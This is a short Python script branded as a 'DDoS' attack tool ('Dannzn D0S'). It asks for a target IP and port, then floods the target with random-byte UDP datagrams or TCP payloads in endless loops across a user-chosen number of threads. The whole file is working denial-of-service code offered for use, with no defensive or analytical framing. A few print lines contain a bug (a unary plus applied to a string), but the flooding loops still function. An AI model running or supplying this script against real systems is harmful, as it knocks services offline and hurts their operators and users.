import random
import socket
import threading
import os

os.system("clear")
print("==========================")
print("=       Dannzn D0S       =")
print("=    Made By : Dannznn   =")
print("=          DD0S          =")
print("=     Danz Attack Tool   =")
print("==========================")
print("                          ")
ip = str(input("IP:"))
port = int(input("Port:"))
choice = str(input("Choice(okay/Tidak):"))
times = int(input("Packets:"))
threads = int(input("Threads:"))
os.system("clear")
def run():
	data = random._urandom(10024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(+"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip,port))
		except:
			print("\033[0;37;40m Attack ip %s port %s"%(ip,port))

def run2():
	data = random._urandom(811)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(+"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip,port))
		except:
			s.close()
			print("\033[0;37;40m Attack ip %s port %s"%(ip,port))

for y in range(threads):
	if choice == 'okay':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()